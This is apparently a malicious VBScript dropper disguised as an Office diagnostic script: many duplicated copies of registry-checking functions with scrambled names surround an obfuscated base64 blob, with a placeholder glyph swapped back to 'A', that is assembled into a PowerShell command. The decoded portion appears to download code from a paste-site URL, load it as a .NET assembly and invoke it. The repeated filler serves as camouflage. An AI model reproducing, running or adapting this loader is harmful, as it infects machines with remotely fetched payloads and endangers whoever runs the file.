    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function


'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function

On Error Resume Next

bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:
bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:
bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:uzwao:bjllh:

dim uRUs 
uRUs = WScript.ScriptFullName

HwxcO = ("J‱Bq‱HE‱YQBz‱Gc‱I‱‱9‱C‱‱Jw‱w‱DM‱Jw‱7‱CQ‱c‱Bp‱Gg‱dQB4‱C‱‱PQ‱g‱Cc‱JQBw‱Ho‱QQBj‱E8‱ZwBJ‱G4‱TQBy‱CU‱Jw‱7‱Fs‱QgB5‱HQ‱ZQBb‱F0‱XQ‱g‱CQ‱cQBu‱HU‱egBt‱C‱‱PQ‱g‱Fs‱cwB5‱HM‱d‱Bl‱G0‱LgBD‱G8‱bgB2‱GU‱cgB0‱F0‱Og‱6‱EY‱cgBv‱G0‱QgBh‱HM‱ZQ‱2‱DQ‱UwB0‱HI‱aQBu‱Gc‱K‱‱g‱Cg‱TgBl‱Hc‱LQBP‱GI‱agBl‱GM‱d‱‱g‱E4‱ZQB0‱C4‱VwBl‱GI‱QwBs‱Gk‱ZQBu‱HQ‱KQ‱u‱EQ‱bwB3‱G4‱b‱Bv‱GE‱Z‱BT‱HQ‱cgBp‱G4‱Zw‱o‱C‱‱K‱BO‱GU‱dw‱t‱E8‱YgBq‱GU‱YwB0‱C‱‱TgBl‱HQ‱LgBX‱GU‱YgBD‱Gw‱aQBl‱G4‱d‱‱p‱C4‱R‱Bv‱Hc‱bgBs‱G8‱YQBk‱FM‱d‱By‱Gk‱bgBn‱Cg‱JwBo‱HQ‱d‱Bw‱HM‱Og‱v‱C8‱c‱Bh‱HM‱d‱Bl‱GI‱aQBu‱C4‱YwBv‱G0‱LwBy‱GE‱dw‱v‱GQ‱cwB0‱H‱‱SwBq‱FQ‱eg‱n‱Ck‱I‱‱p‱C‱‱KQ‱7‱Fs‱cwB5‱HM‱d‱Bl‱G0‱LgBB‱H‱‱c‱BE‱G8‱bQBh‱Gk‱bgBd‱Do‱OgBD‱HU‱cgBy‱GU‱bgB0‱EQ‱bwBt‱GE‱aQBu‱C4‱T‱Bv‱GE‱Z‱‱o‱CQ‱cQBu‱HU‱egBt‱Ck‱LgBH‱GU‱d‱BU‱Hk‱c‱Bl‱Cg‱JwBD‱GQ‱VwBE‱GQ‱Qg‱u‱EQ‱SwBl‱FM‱dgBs‱Cc‱KQ‱u‱Ec‱ZQB0‱E0‱ZQB0‱Gg‱bwBk‱Cg‱JwBO‱G4‱SQBh‱FU‱cQ‱n‱Ck‱LgBJ‱G4‱dgBv‱Gs‱ZQ‱o‱CQ‱bgB1‱Gw‱b‱‱s‱C‱‱WwBv‱GI‱agBl‱GM‱d‱Bb‱F0‱XQ‱g‱Cg‱JwB0‱Hg‱d‱‱u‱Gk‱bgB1‱Go‱OQ‱5‱DI‱MQ‱x‱DE‱MQ‱x‱C8‱N‱‱w‱DM‱Mw‱4‱DM‱N‱‱w‱DQ‱OQ‱4‱DQ‱O‱‱w‱Dg‱Mw‱y‱DE‱MQ‱v‱Dc‱M‱‱5‱DU‱M‱‱w‱DE‱Mg‱0‱DE‱Nw‱w‱Dg‱M‱‱4‱DM‱Mg‱x‱DE‱LwBz‱HQ‱bgBl‱G0‱a‱Bj‱GE‱d‱B0‱GE‱LwBt‱G8‱Yw‱u‱H‱‱c‱Bh‱GQ‱cgBv‱GM‱cwBp‱GQ‱LgBu‱GQ‱Yw‱v‱C8‱OgBz‱H‱‱d‱B0‱Gg‱Jw‱g‱Cw‱I‱‱k‱H‱‱aQBo‱HU‱e‱‱g‱Cw‱I‱‱n‱Fc‱TQB4‱GM‱eg‱n‱Cw‱I‱‱k‱Go‱cQBh‱HM‱Zw‱s‱C‱‱Jw‱x‱Cc‱L‱‱g‱Cc‱UgBv‱GQ‱YQ‱n‱C‱‱KQ‱p‱Ds‱")

dim jfroc

jfroc = ("$ExeNy = '") & HwxcO & "'" 
jfroc = jfroc & ";$KByHL = [system.Text.Encoding]::Unicode.GetString( "
jfroc = jfroc & "[system.Convert]::FromBase64String( $ExeNy.replace('‱','A') ) )"

'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
